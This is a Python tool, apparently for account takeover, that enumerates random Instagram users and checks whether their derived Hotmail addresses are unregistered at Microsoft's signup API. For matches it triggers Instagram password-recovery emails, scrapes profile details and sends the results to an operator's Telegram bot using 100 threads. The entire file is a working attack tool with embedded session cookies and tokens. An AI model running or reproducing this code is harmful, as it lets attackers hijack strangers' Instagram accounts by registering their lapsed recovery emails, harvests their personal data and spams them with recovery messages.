import os
try:
    from requests import get, post
    import time
    import random
    import sys
    import requests
    import uuid
    from cfonts import render
    from threading import Thread
    import threading
    import instaloader
    from ms4 import Instagram
    from user_agent import generate_user_agent
except ImportError:
	os.system('pip install requests')
	os.system('pip install time')
	os.system('pip install random')
	os.system('pip install python-cfonts')
	os.system('pip install threading')
	os.system('pip install ms4')
	os.system('pip install user_agent')
	os.system('clear')


R = "\033[1;31m" #احمر
G = "\033[1;32m" #اخضر
Y = "\033[1;33m" #اصفر
B = "\033[1;34m" #ازرق
rest = "\033[0m" #استرجاع اللون الى الون الصلي
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
SA = '\x1b[38;5;216m'
S2A = '\x1b[1;36m'
S3A = '\x1b[38;5;180m'
S4A= '\x1b[38;5;88m' 
S5A = "\x1b[1;32m" 
S6A= '\x1b[38;5;166m'
K = '\033[2;35m'
a1='\x1b[38;5;161m'#وردي جميل جدا
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي



q=0
w=0
e=0
r=0


token = input(' • Enter The Your Token :- ')
ID = input(' • Enter The Your ID :-')

os.system('clear')

def get_instagram_info(email):
    username = email.split('@')[0]
    he1 = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
             'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356',
        }
    data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
            'ig_sig_key_version': '4',
        }
			
    reso = post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=he1,data=data,)
    resst = reso.json()['email']
    
    
    loader = instaloader.Instaloader()
    try:
        profile = instaloader.Profile.from_username(loader.context, username)
        
        info = {
"user": username,
"email": email,
"name": profile.full_name,
"followers": profile.followers,
"followings": profile.followees,
"post": profile.mediacount,
"rest": resst,
"bio": profile.biography
        }
        try:
            tlgg=(f'''
━═━═━═━═━━═━═━═━
ғᴜʟʟ_ɴᴀᴍᴇ • {profile.full_name}
ᴜѕᴇʀ • {username}
ᴇᴍᴀɪʟ • {email}
ғᴏʟʟᴏᴡᴇʀѕ  • {profile.followers}
ғᴏʟʟᴏᴡɪɴɢ • {profile.followees}
ʙɪᴏ • {profile.biography}
ᴘᴏѕᴛ • {profile.mediacount}
ʀᴇѕᴛ • {resst}
ᴜʀʟ • https://www.instagram.com/{username}
ʙʏ @p_8_q_8

━═━═━═━═━━═━═━═━''')
            print(tlgg)
            post(f"https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+ID+"&text="+str(tlgg))
            with open('hits.txt', 'a') as tix:
                tix.write(f'{tlgg}')
        except:
            error_massage = (f'''
━═━═━═━═━━═━═━═━
         
ᴜѕᴇʀ • {username}
ᴇᴍᴀɪʟ • {email}

━═━═━═━═━━═━═━═━              
                         
''')
            print(error_massage)
            post(f"https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+ID+"&text="+str(error_massage))
            with open('hits.txt', 'a') as ff:
            	ff.write(f'{error_massage}')
                        
        
        
    except Exception as e:
            return f"حدث خطأ: {e}"
            
def insta(email):
    global w,r
    try:
        ins = Instagram.CheckInsta(email)['Is_Available']
        if ins == 'true':
            w+=1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'{G}Hits |{w}{Y} Good_Hotmail| {q} {R} Bd_Hotmail|{e} {a5} Bd_Insta|{r}')
            get_instagram_info(email)
        else:
            r+=1
            
    except requests.exceptions.ConnectionError:
    	insta(email)
    	
def hotmail(email):
    global q,e
    
    cookies = {
    'MicrosoftApplicationsTelemetryDeviceId': '9ca6be8b-b211-4a96-9c7c-f17c0016acda',
    'MUID': '22e36261695b4d4184e7d642cb51105c',
    '_pxvid': 'e82c1474-7dd3-11ef-96a3-1fa5223692d2',
    'MSFPC': 'GUID=933579f26106435c83e6c4b5dd8dc54e&HASH=9335&LV=202409&V=4&LU=1727553458334',
    'mkt': 'ar-IQ',
    'amsc': 'ZhjPEuMrRUKX7lVwhqk/13uXzYWf7v2kGAXEXEhhe9oeUdRWQrrGEUiFFwFirPtf3N3GPGLTqP+73HULzGZiLLPLBIC6VIjt9GvBsDRmIaYUdaAd59zushVv7SZhjE4D08M46MzuntIYosz4VVLKAwCZ/+8WPHHbGlOaLbMm9UnEfLF9IoOOV3JVUNOEUqukSSZA5OuJ676qtez35OCAgcj7fsDVKE8Evv7BFR0Wf6bBK4hzjEZkOk9LUq5aXlNAxXrLbSeUTVZ/zAotpxDnvAGMunXE4cNS8ow8ywf7NY4=:2:3c',
    'ai_session': 'oo6jcGCXkSiOoKRFBpGPY0|1730220366376|1730222153265',
}

    headers = {
    'authority': 'signup.live.com',
    'accept': 'application/json',
    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'canary': 'MUL06tRu1OPENminUQk3LUvrIXubmvfUOkI3LRSDVQEx13aJSBjzg0kHEIE8ddsyoRdwRatBCQHAJhKFrfHbr0yvzJLBkBEF7CjrWbM0LNjZGvSRSYw0wNCIa53IA/PEKfyfS7VSSaFQnvvwmZCqSWEAjsMdPpWKzxkBflusl5zCTJ1M+kWi7MibVkctDWex+lapSydtVU8xH9+yE6P3T+2JblgrWx5LbFXJ/mUQHW1GQjvLpzz5QMZHyFQlXYxs:2:3c',
    'client-request-id': f'{str(uuid.uuid4())}',
    'content-type': 'application/json; charset=utf-8',
    'correlationid': f'{str(uuid.uuid4())}',
    'hpgact': '0',
    'hpgid': '200225',
    'origin': 'https://signup.live.com',
    'referer': 'https://signup.live.com/?lic=1',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': str(generate_user_agent())
}


    json_data = {
    'includeSuggestions': True,
    'signInName': email,
    'uiflvr': 1001,
    'scid': 100118,
    'uaid': f'{str(uuid.uuid4())}',
    'hpgid': 200225,
}

    response = requests.post(
    'https://signup.live.com/API/CheckAvailableSigninNames',
    cookies=cookies,
    headers=headers,
    json=json_data,
).text
    
    if '"isAvailable":true' in str(response):
        q+=1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'{G}Hits |{w}{Y} Good_Hotmail| {q} {R} Bd_Hotmail|{e} {a5} Bd_Insta|{r}')
        
        insta(email)
    else:
        e+=1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'{G}Hits |{w}{Y} Good_Hotmail| {q} {R} Bd_Hotmail|{e} {a5} Bd_Insta|{r}')
        

def gen_user():
    while True:
        try:
            headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/accounts/password/reset/?source=fxcal',
    'user-agent': str(generate_user_agent()),
    'x-asbd-id': '129477',
    'x-bloks-version-id': '1fbbc4a302825e0a86a865a39546a4fa9f0b70d85f967657fb4bb32422a40f5c',
    'x-csrftoken': 'jsj607CfwGKc0IGfWZT8QmEEHOhgcgrg',
    'x-fb-friendly-name': 'PolarisSearchNullStateQuery',
    'x-fb-lsd': 'YvXXl486t9SFdrkul2RLii',
    'x-ig-app-id': '936619743392459',
}

            data = {
                'av': '17841408545457742',
                '__user': '0',
                '__a': '1',
                '__req': '53',
                'dpr': '1',
                '__csr': 'iMkMF5NsIh2I4Aggpik9SLfZgxAZOsJh6DcNcUFXH-GHqnlaoSiypHBiVaFkhtdFmO',
                '__spin_r': '1014910249',
                'variables': '{"id":"' + str(random.randrange(265037278, 361365133)) + '","render_surface":"PROFILE"}',
                'server_timestamps': 'true',
                'doc_id': '7663723823674585',
            }
            
            re = post('https://www.instagram.com/graphql/query', headers=headers, data=data)
            user = re.json()['data']['user']['username']
            email = user + '@hotmail.com'
            hotmail(email)
            
        except:
            gen_user()

            
	
	    
for i in range(100):
    Thread(target=gen_user).start()
  